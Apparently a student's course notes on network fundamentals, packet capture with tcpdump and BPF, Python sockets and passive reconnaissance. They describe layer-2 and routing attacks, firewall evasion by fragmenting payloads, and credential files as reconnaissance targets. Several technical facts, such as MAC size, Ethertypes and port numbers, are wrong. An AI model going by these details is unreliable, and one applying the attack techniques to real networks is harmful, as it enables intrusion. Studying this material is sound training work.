OSI Layers: http://networking-ctfd-2.server.vta:8000/osi

Links:
- https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml (IANA updated port number registry)
- https://www.rfc-editor.org/rfc-index.html (great resource for best practices)
- https://scapy.readthedocs.io/en/latest/introduction.html#what-makes-scapy-so-special (SCAPY is cool)
- https://www.bgplookingglass.com/ (BGP AS database) or https://www.iana.org/assignments/as-numbers/as-numbers.xhtml (IANA AS database) or https://stat.ripe.net/special/bgplay (BGP visualizer)
- https://yasoob.me/2013/07/30/20-python-libraries-you-cant-live-without/ (awesome Python libraries)
- https://docs.vyos.io/en/latest/cli.html (VyOS CLI)
- https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf / https://usermanual.wiki/Pdf/nmapquickreferenceguide.1045482188/view (NMAP cheat sheet)

Section 1 (T,W): Network Fundamentals
- 1 hex val = 1 nibble = 1/2 byte = 4 bits
- Ethernet: IEEE 802.3, Wireless: IEEE 802.11, Token Ring: IEEE 802.5
- Data Link: Level 2 OSI
        - Upper Level 2: LLC (Logical Link Control)
        - Lower Level 2: MAC (Media Access Control)
- Switch operation modes:
        - Cut-through: Tells switch to fast-forward: just look at destination, ignore all other bits and simply forward to dest user. (fastest)
        - Fragment-free: Looks at first 64 bytes of eth frame to decide what to do with the frame
        - Store-and-forward: Checks packet thoroughly, verify and forward it out once the entire frame is received and good to go (slowest)
- CAM Table Overflow/MAC Attack: DOS. Fill CAM tale with spoofed MAC entries, traffic from all further MACs once the CAM table is full will be flooded out on all ports and cause chaos
        - This works because modern software can spoof MACs, as opposed to in the past when MACs were burned-in only
- MAC Formatting (48 bytes)
        - XXXXXX: OUI - Assigned by IANA (24 bytes)
        - YYYYYY: NIC - Assigned by vendor (unique to each device - 24 bytes)
        - Windows: XX-XX-XX-YY-YY-YY
        - UNIX: XX:XX:XX:YY:YY:YY
        - Cisco: XXXX.XXYY.YYYY
        - Unicast: One to one (8th bit is on)
        - Multicast: One to many (8th bit is on)
        - Broadcast: One to all (FF:FF:FF:FF:FF:FF - all bits on)
- MAC Header Ethertypes: 0x0800 (IPv4), 0x86DD (IPv6), 0x0806 (ARP), 0x08100 (VLAN Tag)
- VLAN Types
        - Default: VLAN 1
        - Data - User traffic
        - Voice - VOIP traffic
        - Management - Switch & Router Mgmt
        - Native - Untagged switch & router traffic
- VLAN Hopping Attack: also known as double tagging
        - Since VLAN tag is 1 by default, send a VLAN tag of 1 and then send a second frame with a VLAN tag of 20 (or whatever tag your valuable VLAN system is)
- ARP Types:
        - ARP (OP 1 & 2)
        - RARP (OP 3 & 4)
        - Proxy ARP (OP 2)
        - Gratuitous ARP (OP 2)
- ARP Cache: Includes all resolved MAC to IP resolutions (note: can be easily duped by attackers. also, ARP cache is very volatile, only lasts 20 mins at most)
        - ARP MITM attack: Poison ARP Cache with Gratuitous ARP or Proxy ARP (very simple code - https://git.cybbh.space/net/public/-/raw/master/modules/networking/activities/resources/arp_mitm.adoc)
- VTP: VLAN Trunking Protocol: Cisco proprietary, enables dynamically adding/removing/modifying VLANs
        - VTP domain is a group of switches with the same VTP config & VLAN info
        - VTP Modes: Server, client, transparent (transparent ties into the VTP domain but retains independent configurations - "pretend I'm not here")
        - VTP vulnerability: Can cause switches to dump all VLAN info, cauing a DOS as switch will not support configured VLANs
                - If you have multiple servers on the VTP, the server with the most revisions/updates gets priority. Might accidentally push a bunch of updates to an old server, then accidentally override the whole VLAN
                  config with bogus nonsense from the old server you don't store the modern VTP config on
- DTP: Dynamic Trunking Protocol: Cisco proprietary, enables dynamically creating trunk links
        - DTP Modes: Dynamic-Auto (If no trunks in sight, assumes it's an access/user port), Dynamic-Desirable (assumes it's a trunk port)
        - DTP vulnerability: DTP is on by default. If you don't realize this, you might connect to another switch, the outside switch has dynamic-desirable and automatically assigns a trunk connected to your VLAN and now
          has access to your whole network (TURN OFF DTP)
- Means of figuring out trunking protocols & how crap is set up:
        - Cisco Discovery Protocol (CDP), Foundry Discovery Protocol (FDP), Link Layer Discovery Protocol (LLDP)
        - Note: These send out valuable info across the whole local net, enabled by default
                - You can disable it globally or per interface
- STP: Spanning Tree Protocol
        - In a network with a bunch of switches all connected to each other, STP automatically configures and designates ports such that all switches have the fastest route to the root bridge switch and don't send
          their crap to all the other switches when they don't need to        
        - Root Decision Process:
                1. Elect root bridge
                2. Identify root ports on non-root pridge
                3. Identify the designated port for each segment
                4. Set alternate ports to blocking state
        - Port types:
                - R/Root: one per switch, default gateway
                - D/Designated: Can receive frames
                - B/Blocked: Don't receive frames
- Spanning Tree Attack: Craft a BPDU (bridge protocol data unit) to say "I am the bridge" or designate root as a blocked port to mess with stuff
- Port Security Modes: Helps restrict unauthorized access, prevents CAM overflow atttacks by limiting # of MACs learned on each port
        - Shutdown (default - first device plugged into a port is good to go, but if it detects a different, new device plugged into that same port, it will shutdown and require admin to restore the port)
        - Protect (will allow but log different device)
        - Restrict (will block traffic from the new device but not shutdown outright)
        - NOTE: port security can be bypassed by spoofing MACs
- LAYER 2 ATTACK MITIGATION BEST PRACTICES:
        - Shut down unused ports
        - Enable port security
        - IP source guard
        - Manually assign STP root
        - BPDU Guard
        - DHCP Snooping
- Layer 3: Network
- IPV4: Subnetting, NAT
        - Classes: A (0-127), B (128-191), C (192-223), D/Multicasting (224-239), E/Unused (240-255), Broadcast (all host bits are set to 1)
        - Loopback (127.0.0.0/8), Multicast (class D), Private (RFC 1918), Link-Local (APIPA), Public (everything else except class E)
                - APIPA auto configuration: 169.254.0.0/16 (RFC 3927)
                - DHCP auto configuration: DORA process (RFC 1531)
        - Vulnerabilities of auto config: Rogue DHCP, Evil Twin (pretend to be the target DHCP server - same IP, same config, etc.), DHCP Starvation (overutilize DHCP IP addresses by requesting & reserving nonstop until there
          are no more IP addresses available left to be assigned)
        - IPV4 Header "Flags" section relates to fragmetation
                - Fragmentation is performed by routers
                - MF flag is on for all packets except the last (this indicates no further fragmented packets)
                - Offset is on for all packets except the first (Offset = ((MTU - (IHL x 4)) / 8) ) (default MTU is 1500 bytes, IHL = internet header length, default 5
                        - Note that IHL is measured in words, so IHL 5 must be multiplied by 4 to get the accurate value of 20 bytes
        - Teardrop attack: Custom crafted fragmented packets, putting your data exactly where you want it in the frame instead of what should be there (knowing the offset is essential)
        - IPV6 does not include fragmentation within the header. Fragmentation is done at the individual hosts rather than the router, and a separate header must be used
        - If your firewall isn't smart enough to put together and detect malicious patterns across separate packets, you can include "mal" "icious" "code" in separate packets and reassemble once it's past the firewall
- OS Fingerprinting based off TTL:
        - TTL: UNIX = 64, Windows = 128, Cisco = 255
        - TCP window size: UNIX = 5500-6000, Windows = 8192, Cisco = 4128, Windows XP/FreeBSD = 65535
        - ICMPv4 size: UNIX = 64, Windows = 40
- ICMPv4 Traceroute: ICMP (Windows default), UDP (Linux default), TCP
        - Linux/UDP: [sudo] traceroute [-U] [-I] [-T] 172.16.82.106
        - ICMPv4 attacks: Firewalking (taceroute), oversized ICMP packages that can crash the loader, ICMP redirects, SMURF attack, mapping out network with IP unreachables, ICMP covert channels
- IPV6 Format: 128 bits / 16 bytes, in hex (XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX) (8 hextets: 64 bit prefix, 64 bit Int ID)
        - 2001:0000:0000:0001:0000:0000:0000:0001 can be shortened to 2001:0:0:1::1 (0000 can be shortened to 0, and the longest string of those can be shortened to ::)
        - IPv6 does NOT use broadcast, instead using anycast
                - Global unicast addresses: 2000:/3
                - Unique local: fc00::/7
                - Loopback: ::1/128
                - Link-Local: fe80::/10
                - Multicast: f00::/8
        - When setting up an IPv6 device for the first time (zero configuration), it assigns itself an IP (predetermined prefix, Int ID is set randomly for windows and by EUI-64 for UNIX/CISCO)
                - EUI-64 is based on MAC address 7th bit flipped, meaning if you know the MAC you may be able to figure out the IP
        - IPv6 zero configuration vulnerabilities: SLAAC MITM, can be used for fingerprinting, Rogue DHCP, Evil Twin, DHCP starvation
- NDP (Neighbor Discovery Protocol):
        - Type 133: Router Solicitation
        - Type 134: Router Advertisement
        - Type 135: Neighbor Solicitation
        - Type 136: Neighbor Advertisement
        - Type 137: Redirect
- Routing Protocol Metrics:
        - RIP: Hop (only works with classful routing, ie. carrying subnet mask info within routing updates)
                - Classless routing supports CIDR/VLSM
        - EIGRP: Bandwidth, Delay, Load, Reliability
        - OSPF: Cost
        - BGP: Policy (used for compatibility between different routing protocols)
- Routing Protocols break OSI model, work on multiple levels incl. 2 & 3
        - Routed (not routING) Protocols are routed by Routing Protocols
        - Routing Protocol Vulnerabilities:
        - Vulnerable to DDOS, Packet Mistreating Attacks (PMA), Routing Table Poisoning (RTP), Hit & Run DDOS (HAR), Persistent Attacks (PA)
- BGP: Border Gateway Protocol
        - Roadmap of the internet, relatively complicated setup and takes a way to set up & select paths
        - Advertises IP CIDR address blocks
        - Routes traffic between autonomous systems designated by ASN
        - Selects routes with the fewest hops
- BGP Hijacking:
        - Illegitimate advertising of addresses (advertise someone else's IP block, get their traffic
        - "Black holing" traffic, MITM, stealing prefixes, monitoring traffic, intercepting/modifying traffic, etc.
        - Defend against this with IP prefix filtering, BGP hijacking detection via TTL/RTT, or BGPSec
- Static routing: router(config)# ip route 192.168.1.0 255.255.255.0 144.1.1.2 g0/1
        - Advantages of static routing: Doesn't send updates, no bandwidth used, minimal resources usage, data path pre-determined, good for small networks
        - Disadvantages: time-consuming, prone to fatfingering, admin has to intervene during outages, scales badly for large networks
- Dynamic Routing: 2 Types
        - Exterior Gateway Protocols: BGP
        - Interior Gateway Protocols: RIPv2 / EIGRP / OSPF / IS-IS
        - Advantages: Easy to configure & maintain, no intervention needed, scales well
        - Disadvantages: Consumes resources, updates can be intercepted, data path no predetermined
- First Hop Redundancy Protocols: HSRP / VRRP / GLBP 
        - Basically, designate a single way out and designate other redundant routes that be used to send packets out in case the primary gateway goes down
        - FHRP Attack: Intercept FHRP message exchange, inject manipulated messages, MITM by becoming active forwarder
LAYER 4: TRANSPORT LAYER
- Port Ranges: 0-1023 (well-known/system), 1024-49151 (registered/user), 49152-65535 (dynamic/private)
- TCP Flags: 1 Byte
LAYER 5
- Very common layer 5 protocol: VPN (Virtual Private Network)
        - Not encrypted by default
        - Creates a tunnel through public space to get inside a private network and act as if your IP is a private address within that network
        - 2 Types of VPNs:
                - Remote Access (client-to-site, bypasses firewalls to come directly into a network as if you are on that network)
                - Site-to-Site (geographically virtually locate yourself in another part of the world)
        - IPSEC: Internet Protocol Security (VPN standard that includes encryption and is publicly available)
                - 2 Modes: Transport Mode (client-to-site, payload encrypted end-to-end) / Tunnel Mode (site-to-site, payload encrypted router-to-router)
- Proxy: Intermediary with authority to view traffic and forward it to others
        - For example, if you are outside a network and want to send something to a private network, send it to a proxy that can send it to the destination
- Client-Server Exchange Protocols:
        - SOCKS4: no authentication, only IPv4, no UDP support, no proxies
        - SOCKS5: authenticated, IPv4 and IPv6 support, UDP support, supports proxy binding
        - NETBIOS: TCP 139 / UDP 137/138, used for name resolution (largely replaced by DNS)
                - SMB (incl. CIFS/SAMBA): Rides over NETBIOS. Datagram Service - UDP 138 / Session Service - TCP 139
        - RPC: Any port, allows program to execute a request on a remote computer. Hides network complexities, incl. XML/JSON/SOAP/gRPC
        - API: NOT A PROTOCOL, but often used on networks on layer 5 as a framework of rules/protocols for software components to interact (methods, parameters, data formats, etc.)
LAYER 6: TRANSLATION LAYER
- Includes translation, formatting, encoding (ASCII/HEX/BASE64/EBCDIC), encryption (symmetric/asymmetric), compression
- If it involves a file extension, probably takes place at layer 6
LAYER 7: APPLICATION
- TCP 23: Telnet (remote login/authentication, CLEAR TEXT meaning unencrypted and susceptible to interception)
- TCP 22: SSH. Like Telnet, but encrypted (asymmetric encryption for key exchange, symmetric for actual session). Also provides data stream channeling.
        - SSH Architecture components: Client, server, session, user key (asymmetric public), host/server key (asymmetric public), session key (symmetric, protects session data)
        - Issues: password is only means of authentication
        - On initial SSH host connection, it tells you host fingerprint key's SHA256 hash. If this does not match key saved in /home/student.ssh/known_hosts, SOMETHING IS WRONG and you can say "no" and not connect
                - If remote host key changes, Linux will give you a crazy WARNING @@@ SOMEONE COULD BE EAVESDROPPING!! message notifying you of MITM risks
                        - If this is legit and they literally just changed the key, make it go away by removing the host key from the known_hosts file by the following command:
                          ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
        - Current ssh port is found via "cat /etc/ssh/sshd_config | grep Port"
        - Set SSH port via "sudo nano /etc/ssh/sshd_config" and restart SSH service via "systemctl restart ssh"
        - Create your own SSH public/private key via "ssh-keygen -t rsa -b 4096 -C "Student"
                -t = Encryption (rsa|dsa|ecdsa|ed25519)
                -b = Bit length (1024|2048|4096)
                - stored in ~/.ssh/id_rsa and ~/.ssh/id_rsa.pub
        - "ssh-copy-id student@172.16.82.106" copies SSH public key to remote server, saves key to ~.ssh/authorized_keys on remote server, allows you to authenticate using your key instead of password
- TCP 80: HTTP
        - User Request methods: GET / HEAD / POST / PUT 
- TCP 443: HTTPS
        - Vulnerabilities (both HTTP & HTTPS): Flooding, amplification, low and slow, drive-by downloads, BeEF Framework
- TCP/UDP 53: DNS (Domain Name Service, resolves names to IPs)
        - UDP 53: Queries & responses
        - TCP 53: DNS zone transfers, DNS security
        - DNS Records: A (IPv4), AAAA (IPv6), MX (mail server), TXT (readable text), NS (name server), SOA (start of authority)
- TCP 20/21: FTP (File Transfer Protocol, 2 modes - active & passive. Clear text. May be authenticated or anonymous)
        - TCP 20: Data transfer
        - TCP 21: Control
        - FTP Active issues: NAT, firewall traversal, SSH tunneling issues (Passive FTP solves most of these issues and is most used in modern systems)
- UDP 69: TFTP (Trivial FTP - clear text, used by routers/switches to transfer IOS & config files)
- TCP 25: SMTP (Simple Mail Transfer Protocol - sends emails, no encryption)
        - TCP 465/587: SMTP over SSL/TLS ie. SMTPS
- TCP 110: POP (receives email, no encryption, no server sync. old. POP3)
- TCP 143: IMAP (receives email, no encryption, syncs w/server. IMAP4)
- UDO 67/68: DHCP (Dynamic Host Configuration Protocol)
        - DHCPv4 uses DORA - Discover (Broadcast), Offer (Unicast), Request (Broadcast), Acknowledge (Unicast)
        - DHCPv6 uses SARR (if managed flag is set during SLAAC) - Solicit (Multicast), Advertise (Unicast), Request (Multicast), Reply (Unicast)
        - DHCP vulnerabilities: Rogue DHCP, Evil Twin, DHCP Starvation
- UDP 123: NTP (Network Time Protocol - synchronizes system clocks based on 0-15 stratum levels. 0 is the authoritative time source. a lot of services stop working if the time is too out of sync)
- TCP 49: TACACS (Terminal Access Controller Access-Control System - controls access to network devices/resources through centralized server)
- AAA Protocols: Authentication, Authorization, and Accounting (for third party authentication)
- UDP 1645/1646 & 1812/1813: RADIUS (AAA protocol)
- TCP 3836: DIAMETER (more advanced version of radius)
- UDP 161/162: SNMP (Simple Network Management Protocol)
        - 7 message types: Get Request, Set Request, Get Next, Get Bulk, Response, Trap, Inform
        - Vulnerabilities: Weak community strings, lack of encryption, info disclosure, can be sniffed
- UDP 1023+: RTP (Real-Time Transfer Protocol - video streaming)
- TCP 3389: RDP (Remote Desktop Protocol - like SSH but with GUI, developed by and works only on Windows)
- UDP 88: KERBEROS (used by AD - clients obtain tickets to access services)
- TCP 389/636: LDAP (Lightweight Directory Access Protocol - an easier way to access AD stuff. secure and unsecure versions)
DAY 2: TRAFFIC CAPTURE
- Capture Libraries: Libpcap - https://www.tcpdump.org/, WinPcap - https://www.winpcap.org/, NPcap - https://nmap.org/npcap/
        - Capture libraries require root to listen on all NICs (promiscuous mode), and all captured packets are created as RAW sockets
- Uses for traffic capture: Network troubleshooting, diagnosing improper routing/switching, port/protocol misconfigs, monitor network consumption, intercept credentials, eavesdropping
        - Disadvantages: may require elevated permissions, can only capture what NIC can see, can't capture local traffic, can consume a LOT of resources, may lose packets on busy networks
- 2 means of packet capture: Hardware packet sniffers (rarely used nowadays) & Software packet sniffers
- Socket Types: 
        - User Space Sockets (preinstalled on most machines): Stream socket (all TCP services), Datagram socket (all UDP services)
        - Kernel Space Sockets: RAW socket (custom, requires elevated permissions, very versatile)
- 2 types of sniffing:
        - Passive: packet sniffing is an inherently passive practice
        - Active: Can make sniffing an "active" practice by deliberately sending out packets that will elicit a response
- Common packet capture programs: tcpdump, Wiresharp, NetworkMiner, NetMiner, tshark, p0f, SolarWinds, BetterCap, EtterCap
        - Less common: Kismet, L0phtCrack, McAfee ePO, ngrep, Nmap, Scapy, Snort, Suricata
- Interface naming: Traditional (eth0,eth1,etc.) or Consistent (eno1,ens3,etc.)
        - obviously, carefully choose which interface you're monitoring so you get the data you want
- Tcpdump Primitives (macros): src, dest, host, net, tcp, udp, etc.
        - type: "kind of thing" being referred to, ie. host, net port, portrange
        - dir: "direction" ie. src, dst
        - proto: "restriction to a protocol" ie. ether, arp, ip, ip6, icmp, tcp, udp
- Tcpdump options (Primitives)
        -A = print payload in ASCII
        -D = list interfaces
        -i = specify capture interface
        -e = print data-link headers
        -X or XX = print payload in HEX and ASCII
        -w = write to pcap
        -r = read from pcap
        -v, vv, or vvv = verbosity
        -n = no inverse lookups
        -d = dump the compiled packet-matching code in a human-readable form
        - && = and
        - || = or
        - ! = not
        - Relational Operators: <, <=, >, >=, =, ==, !=, ( )
- CSPF = Primitives (macros)
        - CMU/Stanford Packet Filter Model, commonly called Boolean Expression Tree
        - Simple & easy filter expressions, first user-level
        - Can be slow & create bottlenecks on model CPUs and can have redundant computations of the same info
- BPF = Berkeley Packet Filter (alternative to Primitives, just another way of specifying options like above, but with less redundant computations & ability to input more complex expressions)
        - Control Flow Graph (CFG) Model
        - Uses a simple bufer model that makes it 2-20x faster than CSPF
        - Expressions may be more of a headache but do allow much more precision & complexity
- BPF Construction: 
        - Filters are set using the SO_ATTACH_fILTER (allows us to attach a BPD to the socket to capture incoming packets)
        - COMMAND SYNTAX: tcpdump -n "" -r ~/BPFCheck.pcap ( "| wc -l" for # of packets)
        - BPF Syntax: "tcpdump {A} [B:C] {D} {E} {F} {G}", where
                - A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
                - B = Header Byte offset
                - C = (optional) Byte length (1, 2 or 4, default being 1)
                - D = (optional) Bitwise mask ( & )
                        - BPFs can read either 1, 2 or 4 bytes at once. Bitwise mask allows precise filtering of individual bits -- 0 to ignore bit, 1 to look at & filter off of bit
                        - Examples:
                                - tcpdump 'ether[12:4] & 0xffff0fff = 0x81000abc' (means the entire word starting at byte 12 must equal 0x81000abc, assuming the 17th-20th bytes are off
                                - tcpdump 'ip[1] & 252 = 32' (means the 252nd bit must equal 32)?? (means the 11111100 bits must add up to 32, ie. match 00010000)??
                                - tcpdump 'ip[6] & 224 != 0' (means the 224th bit starting from the 6th byte must be on)??
                                - tcpdump 'tcp[13] & 0x11 = 0x11' (means the 4th and 8th bits --0x11 = 00010001-- must both be on since that is the only way they will add up to 0x11)
                                - tcpdump 'tcp[12] & 0xf0 > 0x50' (0xf0 means look at the first half of byte 12 - REASON BEING 0xf0 = 11110000. > 0x50 means that nibble must be greater than 0x5)
                - E = Relational operator ( = | == | > | < | <= | >= | != | () )
                - F = Result of expression
                - G = (optional): Logical operator ( && || ) to bridge expressions
        - Examples:
                - tcpdump -i eth0 'ether[12:2] = 0x0806'
                - tcpdump -i eth1 'ip[9] = 0x06'
                - tcpdump -i eth0 'tcp[0:2] = 53 || tcp[2:2] = 53'
                - tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'
        - More Examples:
                - 'ether[0:4] = 0xffffffff && ether[4:2] = 0xffff' (search for dest. broadcast MAC address)
                - 'ether[6:4] = 0xfa163ef0 && ether[10:2] = 0xcafc' (search for src MAC of fa:16:3e:f0:ca:fc)
                - 'ether[0] & 0x01 = 0x00' or 'ether[0] & 0x01 = 0x01' or 'ether[6] & 0x01 = 0x00' or 'ether[6] & 0x01 = 0x01' (search for unicast - 0x00 or multicast - 0x01 MAC address)
                - search for 'ether[12:2] = 0x0800' (IPv4) or 'ether[12:2] = 0x0806' ARP or 'ether[12:2] = 0x8100' VLAN Tag or 'ether[12:2] = 0x86dd' IPv6
                - 'ether[12:4] & 0xffff0fff = 0x81000064' (search for 802.1q VLAN 100)
                - 'ether[12:2] = 0x8100 && ether[16:2] = 0x8100' (search for double VLAN Tag)
                - 'ip[0] & 15 > 5' (search for IHL greater than 5)
                - 'ip[1] & 0xfc = 0x40' or 'ip[1] & 252 = 64' or 'ip[1] & 252 = 64' (search for IPv4 DSCP value of 16)
                - 'ip6[0:2] & 0x0ff0 != 0' (search for traffic class in IPv6 having a value)
                - Set ONLY a specific flag to be set // a specific flag to be set, inclusive of other flags
                        - RES: 'ip[6] & 0xE0 = 0x80' or 'ip[6] & 224 = 128' // 'ip[6] & 0x80 = 0x80' or 'ip[6] & 128 = 128'
                        - DF: 'ip[6] & 0xE0 = 0x40' or 'ip[6] & 224 = 64' // 'ip[6] & 0x40 = 0x40' or 'ip[6] & 0x40 = 0x40'
                        - MF: 'ip[6] & 0xE0 = 0x20' or 'ip[6] & 224 = 32' // 'ip[6] & 0x20 = 0x20' or 'ip[6] & 32 = 32'
                - 'ip[6:2] & 0x1fff > 0' or 'ip[6:2] & 8191 > 0' (search for offset field having any nonzero value)
                - 'ip[6] & 0x20 = 0x20 || ip[6:2] & 0x1fff > 0' or 'ip[6] & 32 = 32 || ip[6:2] & 8191 > 0' (search for MF set or offset having nonzero value)
                - 'ip[8] = 128' (v4) or 'ip6[7] >= 128' (v6) (search for TTL in ipv4/6 packet)
                - 'ip[9] = 0x01' or 'ip[9] = 0x06' or 'ip[9] = 0x11' search for ICMPv4, TCP, or UDP encapsulated within IPv4 packet, respectively)
                - 'ip6[6] = 0x3A' or 'ip6[6] = 0x06' or 'ip6[6] = 0x11' (search for ICMPv6, TCP, or UDP encapsulated within IPv6 packet, respectively
                - 'ip[12:4] = 0x0a010101' or 'ip[16:4] = 0x0a010101' (search for IPv4 src or dst address of 10.1.1.1)
                - 'ip6[8:2] = 0xfe80' or 'ip6[24:2] = 0xfe80' (search for IPv6 src or dst address starting with FE80)
                - 'tcp[0:2] = 3389' (TCP src port 3389) or 'tcp[2:2] = 3389' (TCP dst port 3389) or 'tcp[0:2] = 0x0d3d || tcp[2:2] = 0x0d3d' (either)
                - 'tcp[12] & 0xF0 > 0x50' or 'tcp[12] & 240 > 80' (search for TCP with options)
                - 'tcp[12] & 0x0F != 0' or 'tcp[12] & 15 > 0' (search for TCP Reserve field with a nonzero value)
                - 'tcp[13] = 0x12' (search for TCP ACK+SYN ONLY) or 'tcp[13] & 0x12 = 0x12' (search for TCP ACK+SYN inclusive) or 'tcp[13] & 0x12 != 0' or 'tcp[13] & 0x12 > 0' (ACK or SYN)
                - 'tcp[18:2] != 0' or 'tcp[18:2] > 0' (search for TCP Urgent Pointer having nonzero value)
        - 2 types of filter: Capture filters (specify which packets should be saved to pcap while capturing) & Display filters (allow you to change display view in Wireshark/program of choice)
                - NOTE: try to trim out traffic you don't want to analyze with capture filters BEFORE you save it a pcap rather than forcing Wireshark to filter through all that
                  unnecessary crap every single time you run the pcap
- Popular Wireshark menus:
        - View: Colorize traffic
        - Statiscics: Protocol hierarchy, conversations, endpoints, I/O graph, IPv4/6 statistics
        - Tools: Firewall rules
        - Edit -> Preference -> Protocols -> SSL
        - Edit -> Preferences -> name resolution -> GeoIP database directories "Edit":  geolocation
        - File: Exporting objects
        - Analyze: Expert information
        - decrypt traffic
- Passive OS Fingerprinting: similar to tcpdump except it only captures traffic that matches signatures in its database file
        - Searches for signatures by these methods: browsers, search robots, command line tools, most operating systems
        - P0F (passive OS fingerprinting) signature databse: less /etc/p0f/p0f.fp
        - P0F help: p0f -h / run on interface: p0f -i eth0 / run on pcap: p0f -r capture.pcap
        - output to greppable log file: p0f -r wget.pcap -o /var/log/p0f.log
                - cat /var/log/p0f.log | grep {expression}



Section 2 (Th): Socket Creation and Packet Manipulation (2 categories: User/Kernel, 3 types: Stream/Datagram/RAW)
- User Space Sockets (Stream/Datagram):
        - Using tcpdump or wireshark to read a file
        - Using nmap with no switches
        - Using netcat to connect to a listener
        - Using netcat to create a listener above the well known port range (1024+)
        - Using /dev/tcp or /dev/udp to transmit data
- Kernel Space Sockets (RAW):
        - Using tcpdump or wireshark to capture packets on the wire
        - Using nmap for OS identification or to set specific flags when scanning
        - Using netcat to create a listener in the well known port range (0 - 1023)
        - Using Scapy to craft or modify a packet for transmission
        - Using Python to craft or modify RAW Sockets for transmission
        - Network devices using routing protocols such as OSPF
        - Any Traffic without Transport Header (ICMP)
- Stream Sockets: TCP, SCTP, Bluetooth. Methods for connection establishment and teardown.
- Datagram Sockets: UDP. Connectionless, fast.
- RAW Sockets: IP. Sends/receives IP packets without layer 4 protocol-specific formatting.
        - RAW = Kernel Space socket, ie. attempts to access hardware directly and thus requires elevated privileges
Python Socket Programming
- Python Terminology/Structure:
        - Libraries (incl. Standard Python Library)
                - Modules (_import {module} / import {module} as {custom name} / from {module} import {function / *} / from {module} import {function} as {custom name})
                        - Functions (module.function)
                        - Exceptions (try:)
                        - Constants (AF_INET)
                        - Objects ()
- Python Libraries: Socket, Errors, Struct, Exceptions, Sys
- Python Socket Commands: from socket import *
        - s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
                - family: AF_INET*, AF_INET6, AF_UNIX
                - type: SOCK_STREAM*, SOCK_DGRAM, SOCK_RAW
                - proto: 0*, IPPROTO_TCP, IPPROTO_UDP, IPPROTO_IP, IPPROTO_ICMP, IPPROTO_RAW
- RAW sockets are more difficult to craft and thus should only be used under specific use cases:
        - Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering
        - Avoiding defense mechanisms
        - Obfuscating data during transfer
        - Manually crafting a packet with the chosen data in header fields
        - NOTE: must include IP header & next headers, and see RFC 791 for specific details on how to construct an IPv4 header
Encoding/Decoding (UTF-8, Base64, Hex, etc.)
- Encoding: The process of taking bits and converting them using a specified cipher (NOT encryption - encryption uses a secret key to scramble data)
- Decoding: Reverse of the conversion process used by the specified cipher for encoding
- Python text -> hex encoding: echo "Message" | xxd
- Python file -> hex encoding: xxd file.txt file-encoded.txt
- Python hex file -> text decoding: xxd -r file-encoded.txt file-decoded.txt
- Python Hex Encoding:
        import binascii
        message = b'Message'
        hidden_msg = binascii.hexlify(message)
- Python text -> base64 encoding: echo "Message" | base64
- Python file -> base64 encoding: base64 file.txt > file-encoded.txt
- Python base64 file -> text decoding: base64 -d file-encoded.txt > file-decoded.txt
- Python Base64 Encoding: 
        import base64
        message = b'Message'
        hidden_msg = base64.b64encode(message)



Section 3 (F): Network Recconaisance
- 4 Reconnaissance Stages: Passive External, Active External, Passive Internal, Active Internal
        - Always start with passive since it's less intrusive and less likely to be caught
- 4 Reconnaissance Steps: Network Footprinting, Network Scanning, Network Enumeration, Vulnerability Assessment
        1. Network Footprinting: Collect information relating to target network, target systems, target organization (passive external)
        2. Network Scanning: Port scanning, network scanning, vulnerability scanning (active external)
        3. Network Enumeration: Network resources/shares, users, groups, routing tables, auditing/service settings, applications, banners, SNMP/DNS details, machine names, etc.
        4. Vulnerability Assessment: Injection, broken authentication, sensitive data exposure, XML external entities, broken access control, known vulnerabilities, security misconfigs
PASSIVE EXTERNAL
- Info on passive info methods: https://osintframework.com/, http://www.pentest-standard.org/index.php/Intelligence_Gathering, https://www.securitysift.com/passive-reconnaissance/
        - OSINT
        - PAI (publicly available information)
        - Identifying people, external/3rd party sites, technologies, content of interest, vulnerabilities
- DNS Lookups: arin.net, whois.domaintools.com, viewdns.info, dnsdumpster.com, centralops.net
- URL Scan: sitereport.netcraft.com, web-check.xyz, web-check.as93.net, urlscan.io
- IP addresses & subdomains (IP registries: https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml
                                            https://www.iana.org/assignments/ipv6-unicast-address-assignments/ipv6-unicast-address-assignments.xhtml)
- IP GeoLocation lookup: maxmind.com, iplocation.io, iplocation.net, infosniper.net
- BGP Prefixes: bgpview.io, hackertarget.com, bgp.he.net, bgp4.as
- Identifying External/3rd Party Sites: look at parent/subordinate organizations, major clients/customers, services organizations, partners
- Identifying People: look at target website, crawler tools like Maltego or Creepy, search engines, social media, job portals, tracking emails, family tree
- Identifying technologies:
        - File extensions, job listing (.js implies they hire JavaScript developers and implement scripting, as would LinkedIn job listings for JS developers)
        - Server responses (https://websiteguidelines.com/guides/different-types-of-web-servers/)
        - MAC OUI lookup (macaddress.io)
        - Shodan.io (REALLY good for looking at literally all default/unsecured IoT devices in the world)
        - Google Hacking (https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)
        - Website content (https://dorik.com/blog/how-to-tell-what-website-builder-was-used)
- Content of Interest: /etc/passwd, /etc/shadow, SAM database, config files, log files, backup files, test pages, client-side code
- Vulnerabilities: Known technologies, error message responses, running services, running OS, monitoring of running applications
- DNS service:
        - Dig: queries DNS server over UDP 53 (name to IP records)
                - dig zonetransfer.me {A / AAAA / MX / TXT / NS / SOA}
        - Whois: queries DNS registrar over TCP port 43 (info about the owner who registered the domain)
                - whois zonetransfer.me
        - Zone transfer: TCP port 53
                - dir axfr {@soa.server} {target-site}
                - dig axfr @nsztm1.digi.ninja zonetransfer.me (see https://digi.ninja/projects/zonetransferme.php)
        - Netcraft: similar to whois but web-based (https://sitereport.netcraft.com/)
        - Wayback Machine: historical content (https://sitereport.netcraft.com/)
        - Advanced Google searches:
                - site:*.ccboe.net
                - site:*.ccboe.net "administrator"
                - Dork Search (https://dorksearch.com/, https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)
        - Shodan: a search engine for internet-connected devices (https://www.shodan.io)
- Passive OS Fingerprinting (P0F): passive scanning of network traffic & packet captures
